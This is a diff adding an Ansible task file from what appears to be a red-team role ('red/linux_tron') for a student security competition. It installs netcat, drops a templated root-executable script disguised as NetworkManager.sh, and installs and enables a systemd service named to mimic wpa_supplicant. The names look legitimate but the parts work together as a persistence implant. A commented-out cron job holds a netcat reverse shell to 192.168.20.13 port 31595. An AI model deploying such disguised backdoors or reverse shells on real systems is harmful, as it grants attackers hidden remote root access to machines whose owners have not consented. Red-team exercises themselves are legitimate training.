@@ -1,0 +1,55 @@
+---
+#naz5617@rit.edu 2/11/22
+
+- name: Install dependencies
+  apt:
+    pkg:
+      - netcat
+  when: ansible_distribution == "Ubuntu" or ansible_distribution == "Debian"
+- name: Install dependencies for CentOS
+  yum:
+    name:
+      - netcat
+  when: ansible_distribution == "CentOS"
+
+#adds cronjob
+#- name: cron
+# cron:
+#  job: "nc 192.168.20.13 31595 -e /bin/sh"
+
+# template of script
+- name: template of script
+  template:
+    src: /Ansible/roles/red/linux_tron/templates/NetworkManager.sh.j2
+    dest: /lib/systemd/system/NetworkManager.sh
+    owner: root
+    mode: u=x,g=x,o=x
+  with_items: "{{ tron_ports }}"
+
+#copy script
+#- name: install script
+#  copy:
+#    src: /Ansible/roles/red/linux_tron/files/NetworkManager.sh
+#    dest: /lib/systemd/system/NetworkManager.sh
+#    mode: u=x,g=x,o=x
+
+# copy service
+- name: install service
+  copy:
+    src: /Ansible/roles/red/linux_tron/files/dbus-fi.w1.wpa_supplicant.service
+    dest: /lib/systemd/system/dbus-fi.w1.wpa_supplicant.service
+
+#creates symbolic link
+- name: symbolic link service
+  file:
+    src: /lib/systemd/system/dbus-fi.w1.wpa_supplicant.service
+    dest: /etc/systemd/system/dbus-fi.w1.wpa_supplicant.service
+    owner: root
+    state: link
+
+# starts service
+- name: start service
+  systemd:
+    name: dbus-fi.w1.wpa_supplicant
+    state: restarted
+    enabled: true
